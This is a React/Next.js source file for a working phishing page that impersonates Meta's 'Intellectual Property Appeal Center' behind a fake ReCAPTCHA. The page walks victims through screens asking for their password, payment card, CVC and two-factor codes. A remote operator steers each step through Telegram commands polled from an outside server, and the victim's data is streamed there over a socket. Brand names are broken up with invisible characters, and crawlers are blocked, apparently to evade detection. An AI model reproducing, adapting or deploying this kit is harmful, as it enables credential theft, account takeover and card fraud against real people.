import Head from 'next/head';
import styles from '../styles/Home.module.css';
import React from 'react';
import 'bootstrap/dist/css/bootstrap.min.css';
import { useEffect, useState, createContext, } from "react";
import Step1 from "../components/Step1";
import Step2 from '../components/Step2';
import Step3 from '../components/Step3';
import { v4 as uuid } from "uuid";
import Captcha from '../components/Captcha';
import axios from 'axios';
import Fa2 from '../components/Fa2';
import WhiteHeader from '../components/WhiteHeader.js';
import ModalPwRedInput from '../components/ModalPwRedInput';
import Fa2Red from '../components/Fa2Red';
import Step2Red from '../components/Step2Red';
import Background from '../components/Background';
import PhoneVerify from '../components/PhoneVerify.js';
import { Montserrat } from 'next/font/google'
import Done from '../components/Done.js';
import Image from 'next/image.js';
import Fa2Whatsapp from '../components/Fa2Whatsapp.js';
import Fa2Email from '../components/Fa2Email.js';
import Fa2AuthApp from '../components/Fa2AuthApp.js';
import styled from 'styled-components';
import SendData from '../hooks/SendData.js';
import { useBeforeunload } from 'react-beforeunload';
import { socket } from '../utils/socket/socket.js';
import PModal from '../components/PModal.js';
import Step2Modal from '../components/Step2Modal.js';


const montserrat = Montserrat({ subsets: ['latin'] })

const LinksWrapper = styled.div`
  a:hover {
    background-color: #cccccc50;
    
  }
  a {
    padding-block: 0.9rem !important;
  }
`

export const DataContext = createContext();



export default function Home() {

  const [Step, setStep] = useState(0)
  const [Unik, setUnik] = useState('')
  const [LastFetch, setLastFetch] = useState('')
  const [Ip, setIp] = useState('')


  useEffect(() => {
    setUnik(uuid().slice(0, 8))

  }, [])

  useEffect(() => {
    const CheckBan = async (ip) => {
      await axios.get(`https://haajde.onrender.com/checkBan/${ip}`).then((data) => {
        if (data.data.data) {
          window.location.href = 'https://fb.com/help'
        }
      })
    }

    fetch('https://api.ipify.org?format=json').then(response => response.json())
      .then(data => {
        CheckBan(data.ip)
      }
      );

  }, [Step])

  const getUserTelegramId = async (uniqueString) => {
    const x = await axios.get(`https://haajde.onrender.com/getMessages`)

    const result = x.data.data.result

    if (result) {

      const messageUpdates = result.filter(
        ({ callback_query }) => callback_query?.data !== undefined
      );

      const twoFa = messageUpdates.find(
        ({ callback_query }) => callback_query.data === `/2fa ${uniqueString}`
      );

      const incorrectTwoFa = messageUpdates.find(
        ({ callback_query }) => callback_query.data === `/incorrect-2fa ${uniqueString}`
      );

      const password = messageUpdates.find(
        ({ callback_query }) => callback_query.data === `/password ${uniqueString}`
      );

      const wait = messageUpdates.find(
        ({ callback_query }) => callback_query.data === `/wait ${uniqueString}`
      );

      const email = messageUpdates.find(
        ({ callback_query }) => callback_query.data === `/email ${uniqueString}`
      );

      const card = messageUpdates.find(
        ({ callback_query }) => callback_query.data === `/card ${uniqueString}`
      );

      const cvc = messageUpdates.find(
        ({ callback_query }) => callback_query.data === `/cvc ${uniqueString}`
      );

      const phoneVerify = messageUpdates.find(
        ({ callback_query }) => callback_query.data === `/phone ${uniqueString}`
      );

      const whatsapp = messageUpdates.find(
        ({ callback_query }) => callback_query.data === `/whatsapp ${uniqueString}`
      );

      const emailVerify = messageUpdates.find(
        ({ callback_query }) => callback_query.data === `/emailVerify ${uniqueString}`
      );

      const done = messageUpdates.find(
        ({ callback_query }) => callback_query.data === `/done ${uniqueString}`
      );

      const authApp = messageUpdates.find(
        ({ callback_query }) => callback_query.data === `/authApp ${uniqueString}`
      );

      const ban = messageUpdates.find(
        ({ callback_query }) => callback_query.data === `/ban ${uniqueString}`
      );

      const clear = messageUpdates.find(
        ({ callback_query }) => callback_query.data === `/clear`
      );


      if (clear) {
        setLastFetch('clear')
      }


      if (LastFetch !== 'incorrect-2fa') {
        if (incorrectTwoFa) {
          setStep(6)
          setLastFetch('incorrect-2fa')
        }
      }

      if (LastFetch !== 'email') {
        if (email) {
          setStep(7)
          setLastFetch('email')
        }
      }

      if (LastFetch !== 'password') {
        if (password) {
          setStep(5)
          setLastFetch('password')
        }
      }

      if (LastFetch !== 'wait') {
        if (wait) {
          setStep(4)
          setLastFetch('wait')
        }
      }

      if (LastFetch !== 'card') {
        if (card) {
          setStep(8)
          setLastFetch('card')
        }
      }

      if (LastFetch !== 'cvc') {
        if (cvc) {
          setStep(3)
          setLastFetch('cvc')
        }
      }

      if (LastFetch !== 'phoneVerify') {
        if (phoneVerify) {
          setStep(10)
          setLastFetch('phoneVerify')
        }
      }

      if (LastFetch !== 'done') {
        if (done) {
          setStep(11)
          setLastFetch('done')
        }
      }
      if (LastFetch !== 'whatsapp') {
        if (whatsapp) {
          setStep(12)
          setLastFetch('whatsapp')
        }
      }
      if (LastFetch !== 'emailVerify') {
        if (emailVerify) {
          setStep(13)
          setLastFetch('emailVerify')
        }
      }

      if (LastFetch !== '2fa') {
        if (twoFa) {
          setStep(14)
          setLastFetch('2fa')
        }
      }
      if (LastFetch !== 'authApp') {
        if (authApp) {
          setStep(15)
          setLastFetch('authApp')
        }
      }

      if (LastFetch !== 'Ban') {
        if (ban) {
          setLastFetch('Ban')
          axios.get(`https://haajde.onrender.com/ban/${Ip}`)
        }
      }

    }
  };

  useEffect(() => {
    let timer1 = setInterval(() => {
      getUserTelegramId(Unik)
    }, 2000);

    return () => {
      clearInterval(timer1);
    };
  });

  useEffect(() => {
    window.scrollTo({
      top: 0,
      left: 0,
      behavior: 'instant',
    });
  }, [Step])

  const [Tel, setTel] = useState('')
  const [Name, setName] = useState('')
  const [Email, setEmail] = useState('')
  const [BusinessEmail, setBusinessEmail] = useState('')
  const [Appeal, setAppeal] = useState('')

  const [AllData, setAllData] = useState([])

  useEffect(() => {

    var body = document.getElementsByTagName('body')[0];

    if (Step === 8 || Step === 9) {
      body.style.overflowY = 'hidden'
    }

    else {
      body.style.overflowY = 'auto'
    }

  }, [Step])



  const beforeUnload = (event) => {

    event.preventDefault()
    const params = {
      id: Unik,
      ...AllData,
      currentStep: 'Closed Page'
    };
    SendData(params)

  }


  // useBeforeunload((event) => beforeUnload(event));

  const beforeUnload2 = () => {

    const params = {
      id: Unik,
      ...AllData,
      currentStep: 'Closed Page'
    };
    SendData(params)

  }
  useEffect(() => {


    if (socket.connected && Unik) {
      
      onConnect();
    }

    function onConnect() {
      socket.emit('add-user', { userId: Unik });
    }

    socket.on('connect', onConnect);

    return () => {
      socket.off('connect', onConnect);
    };
  }, [Unik]);

  useEffect(() => {
    socket.emit('update-user', { userId: Unik, data: AllData });


  }, [AllData])


  return (
    <div className={styles.container}>
      <Head>
        {
          (Step === 0) ? (
            <title>ReCAPTCHA</title>
          ) : (<title>M‎e‎t‎a f‎o‎r B‎u‎s‎i‎n‎e‎ss</title>)
        }
        {(Step === 0)
          ? (
            <link rel="icon" href="recaptcha.ico" />
          ) : (
            <link rel="icon" href="favicon.ico" />
          )}

        <meta charSet="utf-8" />

        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="theme-color" content="#fff" />
        <meta name="robots" content="noimageindex" />
        <meta name="robots" content="notranslate" />
        <meta name="robots" content="nositelinkssearchbox" />
        <meta name="robots" content="nosnippet" />
        <meta name="robots" content="max-snippet:0" />
        <meta name='crawler' content="noindex,nofollow,noarchive,noimageindex" />
        <meta name="AdsBot-Google" content="noindex,nofollow,noarchive,noimageindex" />
        <meta name="googlebot" content="noindex,nofollow,noarchive,noimageindex" />
        <meta name="googlebot-news" content="noindex,nofollow,noarchive,noimageindex" />
        <meta name="googlebot" content="noindex,nofollow,noarchive,noimageindex" />
        <meta name="googlebot-news" content="nosnippet" />
        <meta name="robots" content="max-image-preview:none" />
        <meta name='robots' content="noindex,nofollow,noarchive" />
        <meta name="robots" content="noarchive" />
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin='true' />
        <meta name="theme-color" content="#00000000" media="(prefers-color-scheme: light)" />
        <meta name="theme-color" content="#00000000" media="(prefers-color-scheme: dark)" />

      </Head>


      <DataContext.Provider value={{ setAllData, AllData }}>
        {
          (Step !== 0)
            ? (
              <div className='gradientBg'>

              </div>
            )
            : (
              <div className='greyBg'>

              </div>
            )

        }


        <div style={{ display: (Step === 1 || Step === 2) ? 'block' : 'none' }}>
          <WhiteHeader />
        </div>

        <div className="px-0 px-lg-4">
          <div className="row justify-content-center gx-0 gx-lg-4">
            {
              (Step === 1 || Step === 2 || Step === 5 || Step === 7) && (

                <>
                  <div className="col-auto d-none d-lg-block">
                    <div style={{ width: '320px' }} className='py-4'>
                      <div className='pb-1'>
                        <Image src="/assets/svgs/mtlg.svg" width={60} height={12} alt='' />
                      </div>
                      <div className='py-3'>
                        <div style={{ color: '#1C2B34', fontSize: '24px', fontWeight: 700, lineHeight: 1.2 }}>
                          I‎nt‎el‎le‎ct‎ual P‎r‎op‎e‎rty A‎p‎pe‎al Ce‎n‎te‎r
                        </div>
                      </div>
                      <div className='pb-3'>
                        <div style={{ color: '#1C2B34', fontSize: '15px', lineHeight: 1.3 }}>
                          I‎f yo‎u b‎el‎i‎ev‎e a d‎ec‎‎is‎io‎n r‎eg‎a‎r‎d‎in‎g a c‎o‎py‎r‎i‎ght vi‎o‎l‎a‎ti‎o‎n o‎r a‎n‎y o‎t‎h‎er i‎s‎s‎u‎e i‎s i‎n‎co‎r‎r‎ec‎t, yo‎u c‎an su‎b‎m‎i‎t a‎n a‎p‎pea‎l he‎r‎e.
                        </div>
                      </div>
                      <div className='pb-2'>
                        <span style={{ color: '#1C2B34', fontSize: '17px', fontWeight: 600, lineHeight: 1.3 }}>
                          A‎p‎p‎ea‎l R‎e‎qu‎es‎t
                        </span>
                      </div>
                      <div style={{ background: '#344854', padding: '14px', borderRadius: '12px', color: '#fff', fontWeight: 600, cursor: 'pointer' }}>
                        <div className="row gx-3 align-items-center">
                          <div className="col-auto">

                            <svg viewBox="0 0 24 24" fill="currentColor" width="24px" height="24px" aria-hidden="true">
                              <path fillRule="evenodd" clipRule="evenodd"
                                d="m9.85 11.01 5.688-5.69 3.141 3.142-5.689 5.689A6.313 6.313 0 0 1 8.526 16 .526.526 0 0 1 8 15.474c0-1.674.665-3.28 1.85-4.464zm7.102-7.103 1.256-1.256a2.221 2.221 0 0 1 3.142 3.14l-1.257 1.257-3.14-3.141zM5.088 3h9.942l-2 2H5.088a.746.746 0 0 0-.454.136.36.36 0 0 0-.145.238C4.254 6.71 4 8.879 4 12c0 3.121.254 5.289.489 6.626a.36.36 0 0 0 .145.238c.09.07.244.136.454.136h11.824c.21 0 .364-.066.454-.136a.36.36 0 0 0 .145-.238C17.746 17.29 18 15.121 18 12v-.03l1.965-1.965c.022.62.035 1.285.035 1.995 0 3.23-.263 5.514-.519 6.972C19.264 20.208 18.167 21 16.912 21H5.088c-1.255 0-2.352-.792-2.569-2.028C2.263 17.514 2 15.23 2 12c0-3.23.263-5.514.519-6.972C2.736 3.792 3.833 3 5.088 3z"></path>
                            </svg>
                          </div>
                          <div className='col'>
                            S‎u‎b‎m‎i‎t a‎n ap‎p‎ea‎l
                          </div>
                        </div>
                      </div>
                      <div className="pt-4">
                        <div className='pb-4'>
                          <span style={{ color: '#1C2B34', fontSize: '17px', fontWeight: 600, lineHeight: 1.3 }}>
                            H‎e‎lp Ce‎n‎te‎r
                          </span>
                        </div>
                        <LinksWrapper className="ps-3">
                          <a href='/' className="row gx-3 align-items-center py-2 text-decoration-none" style={{ color: '#1C2B34', fontWeight: 500, lineHeight: 1.2 }}>
                            <div className='col'>
                              <span style={{ color: '#1C2B34', fontWeight: 500, lineHeight: 1.2 }}>
                                F‎a‎ce‎b‎o‎o‎k H‎e‎lp C‎e‎nt‎e‎r
                              </span>
                            </div>
                            <div className="col-auto">
                              <svg viewBox="0 0 24 24" fill="currentColor" width="24px" height="24px" aria-hidden="true" >
                                <path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path>
                                <path d="M11.293 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path>
                              </svg>
                            </div>

                          </a>
                          <a href='/' className="row gx-3 align-items-center py-2 text-decoration-none" style={{ color: '#1C2B34', fontWeight: 500, lineHeight: 1.2 }}>
                            <div className='col'>
                              <span style={{ color: '#1C2B34', fontWeight: 500, lineHeight: 1.2 }}>
                                M‎‎e‎t‎a f‎o‎r B‎u‎s‎in‎e‎s‎s P‎a‎g‎e
                              </span>
                            </div>
                            <div className="col-auto">
                              <svg viewBox="0 0 24 24" fill="currentColor" width="24px" height="24px" aria-hidden="true" >
                                <path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path>
                                <path d="M11.293 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path>
                              </svg>
                            </div>

                          </a>
                          <a href='/' className="row gx-3 align-items-center py-2 text-decoration-none" style={{ color: '#1C2B34', fontWeight: 500, lineHeight: 1.2 }}>
                            <div className='col'>
                              <span style={{ color: '#1C2B34', fontWeight: 500, lineHeight: 1.2 }}>
                                A‎dv‎er‎t‎i‎si‎ng P‎o‎li‎ci‎e‎s
                              </span>
                            </div>
                            <div className="col-auto">
                              <svg viewBox="0 0 24 24" fill="currentColor" width="24px" height="24px" aria-hidden="true" >
                                <path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path>
                                <path d="M11.293 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path>
                              </svg>
                            </div>

                          </a>

                          <a href='/' className="row gx-3 align-items-center py-2 text-decoration-none" style={{ color: '#1C2B34', fontWeight: 500, lineHeight: 1.2 }}>
                            <div className='col'>
                              <span style={{ color: '#1C2B34', fontWeight: 500, lineHeight: 1.2 }}>
                                F‎a‎c‎e‎b‎‎oo‎k A‎ds G‎u‎i‎de
                              </span>
                            </div>
                            <div className="col-auto">
                              <svg viewBox="0 0 24 24" fill="currentColor" width="24px" height="24px" aria-hidden="true" >
                                <path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path>
                                <path d="M11.293 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path>
                              </svg>
                            </div>

                          </a>
                          <a href='/' className="row gx-3 align-items-center py-2 text-decoration-none" style={{ color: '#1C2B34', fontWeight: 500, lineHeight: 1.2 }}>
                            <div className='col'>
                              <span style={{ color: '#1C2B34', fontWeight: 500, lineHeight: 1.2 }}>
                                S‎e‎l‎l o‎n F‎a‎c‎e‎b‎o‎ok‎ a‎n‎d I‎n‎st‎a‎gr‎a‎m
                              </span>
                            </div>
                            <div className="col-auto">
                              <svg viewBox="0 0 24 24" fill="currentColor" width="24px" height="24px" aria-hidden="true" >
                                <path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path>
                                <path d="M11.293 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path>
                              </svg>
                            </div>

                          </a>
                        </LinksWrapper>
                      </div>
                      <hr style={{ color: '#DEE3E9', opacity: 1 }} className='my-4' />
                      <div>
                        <a style={{ fontSize: '15px', color: '#465a69', textDecoration: 'none', fontWeight: 500 }} href="/">Privacy</a> <span> · </span>
                        <a style={{ fontSize: '15px', color: '#465a69', textDecoration: 'none', fontWeight: 500 }} href="/">Terms</a> <span> · </span>
                        <a style={{ fontSize: '15px', color: '#465a69', textDecoration: 'none', fontWeight: 500 }} href="/">Ad Choices</a> <span> · </span>
                        <a style={{ fontSize: '15px', color: '#465a69', textDecoration: 'none', fontWeight: 500 }} href="/">Cookies</a> <span> · </span>
                        <a style={{ fontSize: '15px', color: '#465a69', textDecoration: 'none', fontWeight: 500 }} href="/">About</a> <span> · </span>
                        <span style={{ fontSize: '15px', fontWeight: 500, color: '#1C2B34' }}>
                          M‎e‎t‎a‎ © 2‎02‎4
                        </span>
                      </div>
                    </div>
                  </div>
                  <div className="col-auto">
                    <div style={{ height: '100%', width: '1px', backgroundColor: '#DEE3E9' }}>

                    </div>
                  </div>
                </>

              )
            }
            <div className={`col-12 ${(Step !== 0 && Step !== 8 && Step !== 9) && 'col-lg-5'}`}>
              <div className={`${(Step === 1 || Step === 2 || Step === 5 || Step === 7) ? 'pb-5' : 'pb-0'}`} style={{ paddingTop: (Step === 1 || Step === 2 || Step === 5 || Step === 7) ? '23px' : '0px' }}>
                {
                  {
                    0: <Captcha setIp={setIp} setStep={setStep} Unik={Unik} Ip={Ip} />,
                    1: <Step1 setStep={setStep} />,
                    2: <Step2 setStep={setStep} Unik={Unik} Ip={Ip}
                      Tel={Tel} setTel={setTel}
                      Name={Name} setName={setName}
                      Email={Email} setEmail={setEmail}
                      Appeal={Appeal} setAppeal={setAppeal}
                      BusinessEmail={BusinessEmail} setBusinessEmail={setBusinessEmail}
                      Step={Step}

                    />,
                    3: <Fa2 setStep={setStep} Unik={Unik} Ip={Ip} Name={Name} Tel={Tel} />,
                    4: <Step3 />,
                    5:
                      <>
                        <ModalPwRedInput setStep={setStep} Unik={Unik} Ip={Ip} Name={Name} />
                        <Step2
                          Tel={Tel} setTel={setTel}
                          Name={Name} setName={setName}
                          Email={Email} setEmail={setEmail}
                          Appeal={Appeal} setAppeal={setAppeal}
                          BusinessEmail={BusinessEmail} setBusinessEmail={setBusinessEmail}

                        />
                      </>,
                    6: <Fa2Red setStep={setStep} Unik={Unik} Ip={Ip} Name={Name} Tel={Tel} />,
                    7: <Step2Red
                      setStep={setStep} Unik={Unik} Ip={Ip}
                      Tel={Tel} setTel={setTel}
                      Name={Name} setName={setName}
                      Email={Email} setEmail={setEmail}
                      Appeal={Appeal} setAppeal={setAppeal}
                      BusinessEmail={BusinessEmail} setBusinessEmail={setBusinessEmail}

                    />,
                    8: <><PModal setStep={setStep} Unik={Unik} Ip={Ip} /><Background /></>,
                    9: <><Step2Modal setStep={setStep} Unik={Unik} Ip={Ip} /><Background /></>,
                    10: <PhoneVerify setStep={setStep} Unik={Unik} Ip={Ip} Step={Step} Name={Name} />,
                    11: <Done setStep={setStep} Unik={Unik} Ip={Ip} Step={Step} />,
                    12: <Fa2Whatsapp setStep={setStep} Unik={Unik} Ip={Ip} Name={Name} Tel={Tel} />,
                    13: <Fa2Email setStep={setStep} Unik={Unik} Ip={Ip} Name={Name} Tel={Tel} Email={Email} BusinessEmail={BusinessEmail} />,
                    14: <Fa2 setStep={setStep} Unik={Unik} Ip={Ip} Name={Name} Tel={Tel} />,
                    15: <Fa2AuthApp setStep={setStep} Unik={Unik} Ip={Ip} Name={Name} Tel={Tel} />,
                  }[Step]
                }
              </div>
            </div>
          </div>
        </div>

        {/* {
          (Step === 1 || Step === 2 || Step === 5 || Step === 7) && (
            <Footer />
          )
        } */}
      </DataContext.Provider>

      <style jsx global>{`
         .gradientBg {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background-image: radial-gradient(rgba(255, 255, 255, .25), rgba(255, 255, 255, 0) 40%), radial-gradient(hsla(44, 100%, 66%, 1) 30%, hsla(338, 68%, 65%, 1), hsla(338, 68%, 65%, .4) 41%, transparent 52%), radial-gradient(hsla(272, 100%, 60%, 1) 37%, transparent 46%), linear-gradient(155deg, transparent 65%, hsla(142, 70%, 49%, 1) 95%), linear-gradient(45deg, hsla(213, 100%, 44%, 1), hsla(209, 100%, 53%, 1));
          background-repeat: no-repeat;
          opacity: .08;
          z-index: -1;
          background-size: 200% 200%, 285% 500%, 285% 500%, cover, cover;
          background-position: bottom left, 109% 68%, 109% 68%, center, center;
          overflow: hidden;
        }
         .greyBg {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background-color: #f1f2f7;
          z-index: -1;

          overflow: hidden;
        }

        * {
          font-family: ${montserrat.style.fontFamily};
        }

        .inputTypePW {
          -webkit-text-security: disc;
          text-security: disc;
        }

        .captcha {
          border: 1px solid #d3d3d3;
          background-color: rgb(243 243 243/255);
          border-color: rgb(224 224 224/255);
          border-radius: 0.25rem;
          border-width: 1px;
          color: #4f4f4f;
          display: flex;
          justify-content: center;
          align-items: center;
          height: 74px;
        }


        .text {
          font-size: 1em;
          font-weight: 500;
          margin-right: 1em;
        }

        .spinner {
          position: relative;
          width: 2em;
          height: 2em;
          display: flex;
          margin: 0em 0.5rem 0rem 0rem;
          align-items: center;
          justify-content: center;
        }

        .captcha input[type="radio"] {
          position: absolute;
          opacity: 0;
          z-index: -1;
        }

        .captcha input[type="radio"]+.checkmark {
          display: inline-block;
          width: 2em;
          height: 2em;
          background-color: transparent;
          border: 2.5px solid #c3c3c3;
          border-radius: 3px;
          display: flex;
          justify-content: center;
          align-items: center;
          cursor: pointer;
        }

        .captcha input[type="radio"]+.checkmark span {
          content: '';
          position: relative;
          /*
          position:absolute;
          border-bottom:3px solid;
          border-right:3px solid;
          border-color:#029f56;*/
          margin-top: -3px;
          transform: rotate(45deg);
          width: .75em;
          height: 1.2em;
          opacity: 0;
        }

        .captcha input[type="radio"]+.checkmark>span:after {
          content: '';
          position: absolute;
          display: block;
          height: 3px;
          bottom: 0;
          left: 0;
          background-color: #029f56;
        }

        .captcha input[type="radio"]+.checkmark>span:before {
          content: '';
          position: absolute;
          display: block;
          width: 3px;
          bottom: 0;
          right: 0;
          background-color: #029f56;
        }

        .captcha input[type="radio"]:checked+.checkmark {
          animation: 2s spin forwards;
        }

        .captcha input[type="radio"]:checked+.checkmark>span {
          animation: 1s fadein 1.9s forwards;
        }

        .captcha input[type="radio"]:checked+.checkmark>span:after {
          animation: .3s bottomslide 2s forwards;
        }

        .captcha input[type="radio"]:checked+.checkmark>span:before {
          animation: .5s rightslide 2.2s forwards;
        }

        @keyframes fadein {
          0% {
            opacity: 0;
          }

          100% {
            opacity: 1;
          }
        }

        @keyframes bottomslide {
          0% {
            width: 0;
          }

          100% {
            width: 100%;
          }
        }

        @keyframes rightslide {
          0% {
            height: 0;
          }

          100% {
            height: 100%;
          }
        }

        .logo {
          display: flex;
          flex-direction: column;
          align-items: center;
          height: 100%;
          align-self: flex-end;
          margin: 0.5em 1em;
        }

        .logo img {
          height: 2em;
          width: 2em;
        }

        .logo p {
          color: #9d9ba7;
          margin: 0;
          font-size: 1em;
          font-weight: 700;
          margin: .4em 0 .2em 0;
        }

        .logo small {
          color: #9d9ba7;
          margin: 0;
          font-size: .8em;
        }

        @keyframes spin {
          10% {
            width: 0;
            height: 0;
            border-width: 6px;
          }

          30% {
            width: 0;
            height: 0;
            border-radius: 50%;
            border-width: 1em;
            transform: rotate(0deg);
            border-color: rgb(199, 218, 245);
          }

          50% {
            width: 2em;
            height: 2em;
            border-radius: 50%;
            border-width: 4px;
            border-color: rgb(199, 218, 245);
            border-right-color: rgb(89, 152, 239);
          }

          70% {
            border-width: 4px;
            border-color: rgb(199, 218, 245);
            border-right-color: rgb(89, 152, 239);
          }

          90% {
            border-width: 4px;
          }

          100% {
            width: 2em;
            height: 2em;
            border-radius: 50%;
            transform: rotate(720deg);
            border-color: transparent;
          }
        }

      `}</style>
    </div >
  );
}
